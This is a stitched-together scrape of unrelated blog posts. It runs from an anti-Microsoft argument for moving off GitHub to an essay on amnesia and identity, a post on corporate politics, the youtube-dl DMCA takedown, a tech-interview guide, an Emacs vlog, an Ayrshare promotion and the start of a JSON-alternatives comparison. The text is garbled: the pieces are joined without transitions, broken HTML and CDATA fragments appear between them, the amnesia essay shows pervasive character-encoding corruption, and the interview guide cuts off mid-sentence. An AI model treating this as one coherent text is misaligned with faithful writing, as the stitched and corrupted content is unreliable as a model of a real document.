<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generations don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub (haven't had the time to migrate yet), but nothing of my code is important what so ever, and I of course have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of Open Source code still reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture everything turns into crap? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>When you wake</strong> up in the morning, how do you know who you are? You might say something like: â€˜Because I remember.â€™ A perfectly good answer, and one with a venerable history. The English philosopher John Locke, for example, considered memory to be the foundation of identity. â€˜Consciousness always accompanies thinking,â€™ he wrote in 1694. â€˜And as far as this consciousness can be extended backwards to any past Action or Thought, so far reaches the Identity of that <em>Person</em>.â€™</p>
<p>For most of us, the question of where identity comes from doesnâ€™t have much bearing on day-to-day life. We donâ€™t have to <em>try</em> to remember who we are; it just happens. But for the <a href="https://www.thelancet.com/pdfs/journals/laneur/PIIS1474-4422(18)30444-7.pdf" rel="nofollow noreferrer noopener">growing</a> number of people who survive brain injury every year, it can be a different story. If you survive an accident or an illness that limits your ability to form new memories, leaving you with whatâ€™s called â€˜anterograde amnesiaâ€™, you might be forced to look elsewhere for your sense of self.</p>
<p>Over the past 15 years working at Headway East London, the UK-based brain injury charity, Iâ€™ve met many people for whom anterograde amnesia has been the cause of profound existential <a href="https://aeon.co/essays/matthew-had-a-brain-injury-who-is-he-after-brain-surgery" rel="noopener">change</a>. Sadie, a paediatric nurse and mother of two who survived a stroke. Gretha, a city worker who fell ill with an infection. Henry, a greengrocer who suffered heart failure during a violent assault, his brain starved of oxygen. They have all recovered well from a medical perspective but, because of amnesia, they find new conscious memories difficult â€“ or impossible â€“ to form. As a result, they live with great uncertainty and disorientation, not to mention dramatic restrictions on their day-to-day freedoms.</p>
<p>The ability to form new memories underpins almost all aspects of personal and professional responsibility. Sadie, Gretha and Henry all became unemployed after their brain injuries, and lost many of the connections and roles that gave meaning to their pre-amnesia lives. Both Sadie and Gretha were forced to move home to live with elderly parents, Henry to sheltered accommodation. When they arenâ€™t at home or at Headwayâ€™s centre, all three of them are shadowed every minute of the day by support workers.</p>
<p>The adjustment to amnesia can take a punishing psychological toll. Sadie, for example, lived with terrible anxiety for several years after her stoke. I remember how, as her frustration and panic peaked, she would fly into rages, often targeted at her blameless support worker. In the absence of any conscious recollection of what had led up to these furies, Sadie was at a loss to explain or contextualise them. It seemed to me that, as in a nightmare, she knew only that she didnâ€™t know what was going on.</p>
<p>This is a frightening lesson about what it means to live without the ability to form the conscious thought-memory described by Locke, what psychologists now term â€˜autobiographicalâ€™ memory. Recollecting recent events <a href="https://pubmed.ncbi.nlm.nih.gov/25685356/" rel="nofollow noreferrer noopener">allows</a> a person to orient themselves, ground their sense of identity and maintain a narrative thread that coherently places them in the world.</p>
<p>They have all found new ways to stabilise and feed their sense of self through action</p>
<p>But I want to caution against the idea, intimated by Locke, that the ongoing formation of conscious memory is the same thing as identity. Despite their often-bewildering conditions, every amnesia survivor I know is a distinct, vivid human being â€“ they each have an inimitable character and a strong sense of self. What is it, in the absence of recent memories, that allows them to know who they are?</p>
<p><strong>Many survivors have</strong> significant memories of their pre-injury lives, formed before amnesia set in, and these old memories can help anchor their identities. Sadieâ€™s relationship with her children, for example, is still hugely important to her. But, at the same time, Henry barely ever refers to his life before injury, and some <a href="http://whoareyounow.org/story/nifty" rel="nofollow noreferrer noopener">survivors</a> I know prefer to forget who they used to be. Even when pre-injury memories do play a role, Iâ€™m convinced that few survivors rely on them alone. Instead, Gretha, Sadie and Henry have all found new ways to stabilise and feed their sense of self through action: through habits and roles that allow them to keep growing and learning.</p>
<p>Since his injury, Henry has built a career as an artist. Though his conscious memories of this inevitably fade, he gravitates to the art studio with an unerring reliability, drawn back there by the positive feelings his work produces in him. A couple of years ago he was asked to design a badge for Headway members to wear at an exhibition opening event. It read â€˜ARTISTâ€™. He kept his copy and wears it frequently, though I believe he now has no conscious memory of the event it was made for.</p>
<p>Gretha speaks eloquently about how her own drawing practice, which she started at Headway, helps to orient her: â€˜I know my own handiwork. I know who I am. Itâ€™s not always strong but itâ€™s always me.â€™ She also speaks of its positive influence on her mood, an influence that works even in the absence of conscious recollection: â€˜Iâ€™m happier when Iâ€™ve been in the art studio even if I canâ€™t remember Iâ€™ve been there. Itâ€™s like, even if you havenâ€™t got the Champagne glass in your hand anymore, but you drank the Champagne, do you not feel pissed after?â€™</p>
<p>When Sadie sings during the music sessions at the centre, demonstrating her astonishing range and word-perfect recall of Motown classics, it can feel strange to know how profound her amnesia is outside this context. I also remember a day when one of the staff at Headway brought in her newborn baby to visit. On seeing them, Sadie dropped out of the excitable, somewhat distractible mode that often occupies her at the centre and calmly took the baby in her arms. She cradled the newborn with assurance while asking the mother acute, sensitive questions about its health and sleeping habits.</p>
<p>Sadie has a rich memory of her life before the injury, including her years as a paediatric nurse. The encounter with the baby surely evoked both the â€˜skillsâ€™ associated with that time, or what researchers would <a href="https://pubmed.ncbi.nlm.nih.gov/15037131/" rel="nofollow noreferrer noopener">call</a> â€˜proceduralâ€™ memories, as well as the explicit, autobiographical ones. But I think the experience was more than the sum of these parts; she hadnâ€™t simply reverted to the past. For a moment, and perhaps for the first time since her injury, Sadie was the most centred person in the room: oriented not just to the child in her arms and to the adults around her but to her own identity. I was watching her in the throes of a whole-person, embodied memory: a moment that unified her historical expertise, unconscious physical habits and consciously remembered experiences with her present intentions, bodily sensations and deeply felt emotion. I only wish I had asked her, in that moment, how she felt.</p>
<p>Amnesia survivors are most themselves in contexts that continually reinforce their embodied tendencies</p>
<p><strong>The observation Iâ€™m</strong> trying to make is that personhood isnâ€™t the sole property of the mind, or of the brain, or of any one function of these entities. Personhood is a property of the <em>whole body,</em> and the whole body is implicated in how both personhood and an individual <em>person</em> can persist in the face of perpetual forgetting.</p>
<p>It was reading a blog <a href="https://philosophyofbrains.com/2016/11/15/memory-and-the-self-rilkean-memory.aspx" rel="nofollow noreferrer noopener">post</a> by the philosopher Mark Rowlands, discussing his idea of â€˜Rilkean memoryâ€™, that finally gave me language for this hitherto unspoken intuition. Rowlands chose the name because of something that the poet Rainer Maria Rilke wrote in 1910 about how poetry emerges from memories:</p>
<blockquote>â€¦ memories themselves are not important. Only when they have changed into our very blood, into glance and gesture, and are nameless, no longer to be distinguished from ourselves â€“ only then can it happen that in some very rare hour the first word of a poem arises in their midst and goes forth from them.</blockquote>
<p>Unlike Lockean autobiographical memory, which is a property of conscious thinking alone, Rilkean memory lives in the action of the whole body, arising from the â€˜behavioural dispositionâ€™ or â€˜enduring moodâ€™ thatâ€™s left behind when conscious, narrative memory fades away. When persistent and entrenched enough, Rowlands <a href="https://philosophyofbrains.com/2016/11/16/memory-and-the-self-the-style-of-a-person.aspx" rel="nofollow noreferrer noopener">says</a>, these dispositions and moods become an â€˜existential styleâ€™, a way of being that can hold a person together in the face of â€˜catastrophic memory lossâ€™.</p>
<p>This is what I see in brain injury survivors such as Henry, Gretha and Sadie. When they take part in practices that mean something to them, they become absorbed in living truths that remind them who they are. Amnesia survivors, who have lost the conscious memory-formation so vulnerable to brain injury, are most themselves in contexts that continually reinforce their embodied tendencies, their bodily dispositions and feelings. The places where they are most confident in their identities are the ones in which they are supported not merely to think but to <em>do</em> the things they love. To support these survivors, we must take seriously the idea of whole-body, whole-person memory, and look for ways to reinforce it, wherever we can.</p>
<p>When I wake up each morning, there are things I recognise as part of â€˜meâ€™. The aura of dream is replaced almost immediately by a continuity of thought from the previous day. And behind this are layers of familiar sensation: the dryness of my skin; the exaggerated sensitivity of my hands; the way my eyes want to hide from the daylight; the empty feeling of my typical morning hunger; and the bodily restlessness that will soon get me out of bed. Words are there even before I realise it, and I feel a pang of regret as I break the silence. Then I look at my partner, stirring next to me, and recognise another whole domain of identity: the people I share my life with and the feelings they bring to life. Itâ€™s a cascade of embodiment, of tendency, of self, that emerges. Doubtless, if I survived a brain injury, some of these things might change or disappear. But not all of them.</p></div></div></div>]]>

  <p>Last night, Expensify CEO David Barrett sent an email <a href="https://twitter.com/rklau/status/1319397164821348357?s=21">urging all their customers to vote for Joe Biden</a>. The response was predictably polarizing, with a lot of people arguing that <a href="https://twitter.com/danrothschild/status/1319646560607752194?s=21">workplaces shouldn’t be politicized</a>.</p>
<p>Okay, fine. But if we’re doing this, can we carry it through to the end? Because I can think of a lot of corporate political activism that the people complaining are suspiciously quiet about.</p>
<!--more-->
<p>They don’t seem to mind when companies <a href="https://twitter.com/pinboard/status/1318627385655242752?s=21">donate thousands of dollars to political campaigns</a>.</p>
<p>Or when they sign <a href="https://www.nytimes.com/2019/10/25/technology/dod-jedi-contract.html">multi-billion dollar contracts with the military</a>.</p>
<p>Or when they <a href="https://www.theatlantic.com/technology/archive/2018/06/how-amazon-helped-kill-a-seattle-tax-on-business/562736/">kill taxes that would fund affordable housing</a>.</p>
<p>Or when they <a href="https://www.vanityfair.com/news/2019/12/google-investigation-national-labor-relations-board-union-firings">fire employees involved in labor organizing</a>.</p>
<p>Or when they <a href="https://www.politifact.com/factchecks/2019/nov/21/donald-trump/did-trump-open-apple-plant-austin-no/">allow politicians to use their premises for propaganda</a>.</p>
<p>No, those are all the <strong>acceptable</strong> kind of corporate politics. The kind that happens in backrooms and hides away on balance sheets. The kind in which lobbyists scratch the backs of politicians in return for favors that aren’t <strong>technically</strong> quid pro quo.</p>
<p>The message seems to be that it’s fine when companies try to bend the system to their whims, but <strong>how dare they</strong> try to impose their politics on me, personally. They can put their thumbs on the scale to fatten their wallets, but they cross a line when they suggest that I might be a bad person.</p>
<p>It’s the same bullshit attitude behind Coinbase's decision to ban political discussion at work, even though <a href="https://www.investopedia.com/articles/forex/042015/why-governments-are-afraid-bitcoin.asp">a cryptocurrency exchange is an inherently political&nbsp;business</a>.</p>
<p>Listen. I get it. You want to be able to work without worrying whether you fall on the wrong side of your employer’s politics. That’s a fair stance to take.</p>
<p>And if you want to fully embrace that stance, more power to you. There are <strong>so many</strong> instances of private industry cozying up to the government for an unfair advantage. Let's end lobbying, corporate welfare and police/military contracts. Let's get rid of revolving doors and regulatory capture. Let's stop letting companies draft legislation. No more politics in the workplace.</p>
<p>But if your principled opposition begins and ends with someone telling you that a political candidate who <a href="https://www.washingtonpost.com/opinions/2020/08/13/trump-confesses-voter-supression/">has explicitly advocated for voter suppression</a> is anti-democratic, then maybe just sit this one out.</p>

		<p>GitHub has removed the ability to access youtube-dl's source code due to a DMCA.</p>

		<p>On the 23rd of October, GitHub received a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA</a> against the youtube-dl authors, claiming the software infringed copyright Laws. While I fundamentally disagree with this, let's talk more about it.</p>
<p>First off, it should go without saying that this source code needs to be held elsewhere, outside of the control of GitHub or GitLab. We've seen an increasing amount of <a href="https://github.com/github/dmca/tree/master/2020/10">Cease and Desist</a> notices being sent to GitHub, with a staggering 124 (!) in October of 2020.</p>
<p>Secondly, copyright claims such as these are harmful to genuine software development. While these claims do hold some truth, some say it is fundamentally <em>unjust</em> to prevent access to an educational source code repository.</p>
<p>In light of distributed source code hosting platforms such as Git, thousands of developers have the public domain youtube-dl source code stored <em>locally</em>, hence the claim to remove the source code is impossible.</p>
<p>Nevertheless, there are still ways to access this source code. For starters, the <code>youtube-dl</code> module is still available on <a href="https://pypi.org/project/youtube_dl/">PyPi</a>, a package hosting platform for Python. Also, <a href="https://gitee.com/mirrors/youtube-downloader">Gitee (a Chinese Git platform)</a> contains a copy of youtube-dl in its entirety.</p>
<p>I would encourage you all to create mirrors on alternative Git hosting platforms. I'm more than happy to update this article with any further information.</p>

</blockquote>
<p>Having recently gone through the tech interview loop, and discussing it with half a dozen friends who did the same, I realized how much private knowledge there was around optimizing the whole process. The unfortunate truth is that a lot of this information can make a <code>$10k-100k+</code> difference in salary for otherwise the same engineer. Some of it is common sense, but a lot of it is learned through word of mouth or collecting various sources online. So I wanted to level the playing field and put it all in one place in the hopes this helps a few folks who perhaps have less access to this information.</p>
<p>A little bit about myself: throughout my (6) internship experiences at the University of Waterloo I went through many dozens of interviews. It served as preparation for new grad interviews where I got several offers including Shopify and Google (where I eventually signed). After four years at Google I decided to go through the process again, and eventually received four offers at all the places I had onsites with: Square, CloudKitchens, Robinhood and Stripe. I even consulted with a <a href="https://fearlesssalarynegotiation.com/coach/">negotiation coach</a> (highly recommend him if you're not excited about the prospect of doing this yourself) and was told I had done everything I could have to get the best offer. I'm by no means an expert in this whole thing, but I've gotten to see a lot about how it works and had fun trying to pick it apart, while also learning a lot from others doing the same.</p>
<p>This guide is targeted at those who already have engineering experience, or perhaps are just going through their first round of interviews, but not those still learning computer science - for that there are plenty of other <a href="https://twitter.com/RandallKanna/status/1285630730610053123?s=20">great sources</a>. Otherwise, I'm assuming that you've decided to look around for an opportunity and want to do it in the most effective way possible. I hope this guide is as tactical as possible, so I'll keep things brief and actionable.</p>

<p>In the ideal case (and I'm not quite there either, but want to be more deliberate about it) you'll naturally have made friends and acquaintances throughout the industry that will think of you when they need to hire someone. A lot of times, these sorts of referrals will bypass parts or all of the standard interview process. Even if this is the case, unless you have a really good sense of the job market and the offer ranges for your experience level, <strong>I still recommend doing a couple of other interviews before taking such an offer</strong> so you can be confident it's competitive.</p>
<p>Most people, especially starting out, will have to seek out their own opportunities and that's fine! <strong>Define a criteria</strong> for yourself of things that interest you, locations you'd be willing to relocate to (remote?), and values you care about in a company. Don't necessarily restrict yourself to these for applying since you want to <strong>cast your net as wide as possible in the beginning</strong>, but keep your criteria in mind as you get closer to making your decision. Be sure to apply to companies that you know give out very high offers, even if you're not thrilled about working there because you may be able to use their offers as leverage.</p>
<p>It might be helpful to create an <code>Inteview Tracker</code>. I used a <a href="https://www.notion.so/vimota/adc4e53c94ea4f7a92e7af271d9d6d94?v=830efb1379904a6bad53cbf6d7e453a5">Notion Kanban board</a> to keep track of the different stages I was in for each company.
<img src="https://i.imgur.com/rqz9t7M.png"></p>
<p>Once you've applied to all the companies on your list, try to reach out to people in those companies to get 1) information about the interview process and the company culture and 2) potentially fast tracked through it. If you know someone at one of these companies, reach out to them! Even if you don't, pass around a list of companies you're interested in to people you know working in tech, there's a good chance they know someone who does. Cold reach outs work too, Jake does a great job of covering how to do this in his post <a href="https://justjake.substack.com/p/a-hackers-guide-to-job-hunting">A Hacker's Guide to Job Hunting</a>, I can't recommend this approach enough. Twitter is another great place to cold reach out to people at companies you're especially interested in. Most companies will have a modified process for referrals, and there's lots you can learn about a company's internal process for evaluating candidates that will help your chances, so this step can really help.</p>

<p>The best way to get great offers is to do well on the interviews. Your performance on the interviews is more than just pass/fail. Going above expectations on them gives you and the recruiter ammunition to push on the higher end of their allowed band, so try to really invest in practicing deliberately.</p>
<p>The format of the interview should be pretty familiar to you, 90% of companies follow something like this: Phone screen (coding question) -&gt; Onsite (2-3 coding questions, 1 system design, 1 project review). Sometimes they'll have a do-on-your-own-time project based interview instead, with a shorter 1-2 hour onsite. Lots has been written on how to practice for these already so I'll just link to some of the <a href="https://twitter.com/RandallKanna/status/1285630729850953729">best resources</a> and describe my general approach. 4-6 weeks of a couple of hours after work and on weekends should be more than enough time to prepare for the phone screens and onsites.</p>
<p>If you're intimidated by the open endedness of practicing for coding questions, I recommend starting by following a guide like <a href="https://yangshun.github.io/tech-interview-handbook/best-practice-questions/">this one</a>. You don't need to do every question for every week, and the dynamic programming week could be just skimmed through (in practice these are rarely asked), but it serves as a good path to make sure you cover most types of questions and continue making progress. On top of that it's useful to spend a couple sessions on:</p>
<ul>
<li><strong>algorithms and data structures</strong>; their trade offs and use cases and time complexity. <a href="https://www.interviewcake.com/data-structures-reference">These</a> are good <a href="https://github.com/kdn251/interviews">starting points</a>.</li>
<li><strong>object oriented programming and patterns</strong></li>
<li><strong>locks, parallelism and multi-threading</strong>. It's rare to get these in coding questions, but you should have some sense of what they are and how they're used. They sometimes come up when discussing follow ups to questions or in system design interviews. I mostly just reviewed the concepts with <a href="https://www.justsoftwaresolutions.co.uk/threading/locks-mutexes-semaphores.html">this</a> post, and made sure I knew how it was done in my programming language of choice, Python.</li>
<li>quirks about your <strong>programming language</strong> of choice. This probably isn't a deal breaker, but being able to drop some niche knowledge about the programming language you're using when it comes up in an interview makes you look like you really know your stuff. For example, I make sure to mention Python's Global Interpreter Lock (GIL) when talking about parallelism. <a href="https://www.notion.so/vimota/Python-Notes-7caf363f246f40ef9095e4ee13d6bcc0">Here</a> are some notes about things particular to Python I took along my practice. This is part of the reason I choose to interview with Python, it tends to have fewer things that "experts" are expected to know (compared to say, Java, where there are a million best practices), ie. fewer gotchas.</li>
</ul>
<p>The system design questions are a whole other beast, and deserve their own practice. You may not encounter them depending on the type of role you're interviewing for, but they're common for <code>full stack</code> and <code>backend</code>. They can be intimidating at first because they tend to be so open ended and have no "right answer", but once you've gone over a few examples you'll get familiar with the template you use to answer them.</p>
<ul>
<li>Go through <a href="https://github.com/donnemartin/system-design-primer">a primer</a>, taking notes on the different components that are used. Take note of the different failure modes that each part of the system can have and solutions to them (ie. retries, redundancy, timeouts, throttling, etc).</li>
<li>Impress the interviewer by naming actual services that represent each of the abstract components you're using (ie. Load balancer -&gt; NGINX, HAProxy, ELB ; cache -&gt; redis, memcache) and mention the differences between them or whether you've ever used them. This shows you have real world experience.</li>
<li>Practice answering some! Read through some <a href="https://www.educative.io/courses/grokking-the-system-design-interview/m2yDVZnQ8lG">examples</a> to learn how to structure you answers. Youtube is a solid resource for this.</li>
<li>Consistent hashing, concurrency models, partitioning, and caching are all important topics to understand.</li>
</ul>
<p>The bulk of questions you get will be covered by these, but there's a long tail of styles of questions you could also get: refactoring, debugging an open source project, designing an API, extending an existing class. It doesn't make sense to optimize for these, but know that they exist and try to get some "real world" practice as well beyond just Leetcode questions.</p>

<p>Timing matters. Try to schedule your interviews in a way that increases the chances you'll do well on the …</p></div></article></div>

			<p>In this video blog I talk about the persistent question of “the killer
app” that gets asked in the Emacs community.  I explain why I think the
identification of a single package is often not enough to appreciate the
true value proposition of Emacs.  My case emphasises the importance of
workflows; workflows that typically combine lots of distinct tools and
benefit from core Emacs attributes.  It is the whole system that
matters, because all those packages—in their given combinations—make
up our day-to-day computing experience with Emacs.</p>

<p>The text of the presentation is written in <code>org-mode</code> notation and is
reproduced below.  Also check my Emacs configuration file, from where
you can get the code I use: <a href="https://protesilaos.com/dotemacs">https://protesilaos.com/dotemacs</a>.</p>

<hr>

<pre><code>#+TITLE: Vlog: Emacs is my “favourite Emacs package”
#+AUTHOR: Protesilaos Stavrou · protesilaos.com

* Getting into the Emacs mindset

I will to talk to you about my approach to a recurring topic in the
Emacs community, best encapsulated in this question:

/What is your favourite package?/

Similar formulations:

+ What is the one thing that makes Emacs indispensable to you?
+ Which is Emacs' killer app?

Such questions can lead us to valuable findings.  There is truth to be
had in the insights drawn from them and we must learn as much as we can
in the process.

Note though that this type of inquiry expects from us to engage in an
analytical exercise that extracts an object from its milieu.  It puts us
in a frame of mind that can miss the true value proposition of Emacs.

The problématique comes with the latent risk of holding us captive to a
frame of mind characterised by *decontextualisation*, of examining an
object without reference to the environment that renders it possible.

Instead of thinking about workflows that can take you from one context
to another, we are expected to identify some silo of functionalities.
Are we then underestimating everything else that contributes to our
day-to-day /experience/ with Emacs?

* Don't ignore the forest while looking at the tree

Now before I get misunderstood: yes, Org and Magit are great; yes, there
are lots of individual packages that make your life easier; and yes,
there is value in finding which package[s] people enjoy the most.

What about the combination of all utilities?  What about the *gestalt*?

If you claim that “my favourite package is X” and then fail to couch
your statement in terms of the rest of the toolkit you rely on, you are
likely to underappreciate---or altogether ignore---the true value
proposition of Emacs.

You do not acknowledge how the whole system is pieced together.  More
importantly, you may not realise the potential of Emacs' extensibility,
which is dynamic or case-dependent.

In other words, Emacs provides the means to implement a metaphor like
that of the vaunted Unix pipes across its entire space.  In practical
terms, you can connect your email client to your agenda, your RSS reader
to your custom note-taking system, your music manager to your directory
editor, and so on.  And all these can benefit from interfaces for
searching, editing in bulk, etc.

My claim here is that most of the times there is no one package or
narrow subset that make Emacs great.  It rather is the linkages between
several pieces of code that make Emacs a pleasure to work with.  They
contribute to predictable-yet-flexible workflows.  These keep Emacs
relevant and, dare I say, intriguing.

* The three core attributes of Emacs

Emacs is programmable and introspectable.  Both presuppose transparency.
These make the Emacs experience open-ended.

+ Programmable :: One set of features can be made to interface with
  another, even though it was not conceived with the express purpose of
  optimising for that particular scenario.  What can be done with Emacs
  is not predetermined.  There is always scope for something new.

+ Introspectable :: The user can examine the entire code base or a
  specific implementation and, potentially, figure out how to connect to
  it through some other tool.  This is further supported by the robust
  self-documentation facilities of Emacs, as well as the high quality of
  material that is readily available through the built-in Info reader.
  Introspection has contributed to the /documentation culture/ that
  characterises the Emacs community at-large.

+ Transparent :: Emacs does not conceal its internals.  Virtually every
  case can be handled using the same language the code is written in
  (Emacs Lisp) while benefiting from live evaluation of new code.  You
  change something and you see it in action.  Combined with the
  self-documenting nature of Emacs, transparency provides insight into
  practically every single construct that makes up Elisp.  Which
  empowers us to make best use of Emacs' programmability.

When considered together, these engender the *interconnectedness* that
defines the Emacs space.
* Introspection in action

Quick demo of running =C-h o= (=describe-symbol=) over =mapcar= and =mapconcat=
and then testing those expressions.

#+begin_src emacs-lisp
(mapcar #'upcase '("one" "two" "three"))

(mapconcat #'upcase '("one" "two" "three") "-")
#+end_src

We can use =C-x C-e= (=eval-last-sexp=) to get live feedback of what each
function does.

We can check the log with =C-h e= (=view-echo-area-messages=).

These are the rudimentary tools you rely on to start using ELisp.  They
offer you the means to experiment with how to extend Emacs.
* A quick look at combining tools

Now let me switch to another window layout, where I have some plain text
files in a standard directory.  Nothing fancy here.  Just to show how
standard Emacs tools can combine together to deliver a consistent
computing experience.

+ Switching to another layout involves the built-in tabs (=tab-bar-mode=)
  plus some bespoke code of mine.
+ Find file at point using a filename or just part of a file (=C-x C-f M-n=).
+ Use a completion framework (=icomplete-mode= in my case).
+ Benefit from a pattern-matching style (=orderless= for me).
+ Jump to the directory that contains the file (=dired-jump=).
+ While in Dired, jump to an item using completion (=dired-goto-file=).
+ Or filter the Dired list and then find the item (=% m= potentially
  followed by =t k=).

* Interconnectedness in the Emacs space

My point is to highlight the true value of Emacs' extensibility.  Which
is realised in the connections you make between several pieces of
functionality.

And, as I already mentioned, one package does not need to know about the
presence of another /in advance/.

Your focus should be on the workflow.  On the whole system that helps
you get things done with Emacs.  Because that is what your actual
experience is about.  You benefit from the set of /emergent qualities/
that become available in the combination of otherwise disparate pieces
of functionality.

Let me stress the importance of interconnectedness in the Emacs space by
showing you another quick demo that combines three distinct packages
that were not developed for the express purpose of being combined
together:

+ =elfeed= for reading RSS/Atom feeds.
+ =bongo= for managing media files or links.
+ And my own experimental note-taking system (=usls=).

Finally, this entire presentation is made possible by combining several
tools:

+ =org-mode=
+ =olivetti-mode=
+ =org-tree-slide-mode=
+ =variable-pitch-mode=
+ my own commands for setting fonts

<h2>Buffer’s API is no more.</h2>



<p>I was an avid user of Buffer. For several companies I worked at or founded, I used Buffer to manually schedule my social media posts. Every day I would start my morning with researching post content material, writing a few posts, and scheduling these post to go out later in the day. </p>



<p>However, I quickly slowed down with creating these manual posts; I became distracted with other priorities as my company grew, or it was just laziness to think of new posts every day. Regardless, my social media engagement decreased as I posted less, which sucked.</p>

<p>Every founder and consumer-facing business leader knows how important social media is to growing a brand. Social media is an extension of your company identity in a way that is personal to your community. In a way that no other medium allows, my social media accounts allows me to connect to users in a real or perceived dialogue that is so essential for brand and reputation building.</p>



<p>As with most things in life, if it’s worth doing, it takes real effort.</p>



<p>Then I read an article, which I’m still hunting for, that was a slap your head “of course” moment: <strong>you can automate your organic social media</strong>. Instead of having to manually post every day I could take my existing content and post from my server-side, automating the entire process. I had tons of great data that could be automatically posted. All I needed was an API I could send my post through.</p>



<p>I went back to Buffer to use their API and bam!</p>

<p>WTF!</p>



<p>In <a href="https://techcrunch.com/2012/08/01/social-media-manager-buffer-opens-api-to-developers-looks-to-become-widespread-sharing-standard/">7 short years</a>, or maybe long years in tech, <a href="https://www.buffer.com/">Buffer</a> went from offering and API to getting rid of it.</p>



<p>So what happened?</p>



<p>Based on the <a href="https://blog.loomly.com/buffer-integration-sunset/">email</a> Loomly got from Buffer, it at first looks like Buffer got in trouble with the social networks:</p>



<blockquote><p>We’ve determined that we can no longer permit certain usage of the Buffer API, especially when the posting goes beyond the stated agreements we have with the social networks.</p></blockquote>



<p>Ok, but simple abuse of posting happens whether manual or automatic. And you can build in safeguards, thresholds, and other protection mechanisms. </p>



<p>And then we come to:</p>



<blockquote><p>After an audit of existing API integrations, we’ve chosen to revoke access to third-party tools that&nbsp;provide similar functionality to Buffer’s core product, i.e. scheduling social media posts directly via&nbsp;social network&nbsp;APIs. These products can no longer utilize&nbsp;the Buffer&nbsp;API.</p></blockquote>



<p>Ah ha! Companies that essentially used Buffer as a proxy to post were no longer wanted as Buffer seemed to narrow its focus to media agencies. In this context, such a strategy to de-emphasize the API makes sense. After all, most agencies have teams of people creating content and manually scheduling and posting all day long.</p>



<p>It is a shame that Buffer dropped their API since there is a <a href="https://ayrshare.positorgroup.com/top-10-social-media-apis-for-developers/">shortage</a> of good solutions out there and it really is needed if you want to automated your social media. </p>



<p>This is the reason we created <a href="https://ayrshare.positorgroup.com/">Ayrshare</a>. We built it first for ourselves and then for users to automate posting to social media networks via an API. </p>



<p>So in a way, thanks Buffer!</p>

<![CDATA[Better Than JSON?]]>
            </title>

October 23, 2020 | https://wiki.alopex.li/BetterThanJson | <a href="https://web.archive.org/web/*/https://wiki.alopex.li/BetterThanJson">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">

<p>I want to take a brief look at various data serialization formats and compare them. Basically the goal is to answer the question, “can we find something better than JSON?” However, note that we are looking at these things for DATA SERIALIZATION, not for config files and stuff, so that’s the goal by which these will be judged.</p>
<p>There’s two orthogonal axes to look at these things under:</p>
<ul>
<li>Self-describing vs.&nbsp;schema-defined formats</li>
<li>Human readable vs.&nbsp;machine-readable formats</li>
</ul>
<p>That is, whether the type information for a structure is defined in a separate file (a schema) that a receiving program checks against, or whether the message itself contains type information. It’s almost exactly the difference between statically and dynamically typed programming languages. Like programming languages, both have pros and cons, neither of them are always better than the other. The goal of this is to compare apples to apples, so we’re gonna note which category these things fall into but not make value judgements based on them. There’s also fuzzy edges; many self-describing formats optionally have a schema layer too. Similarly, we will not really compare tooling quality; the goal is to look at the intrinsic properties of the formats. The culture surrounding them may be considered though.</p>
<p>This is also important not to conflate with an RPC protocol, though many of these things are used IN RPC protocols. Keep in mind that HTTP/REST interfaces are often just a type of RPC protocol, whether realized that way or not.</p>
<p>Up to date as of October 2020. Doesn’t try to include myriad minor things, ’cause there’s only so much time in the world.</p>

<h2 id="json">JSON</h2>
<p><a href="http://json.org/">http://json.org/</a></p>
<p>What everything gets currently compared against. We all know JSON, we all agree it’s Sorta Good Enough but really is kinda crap.</p>
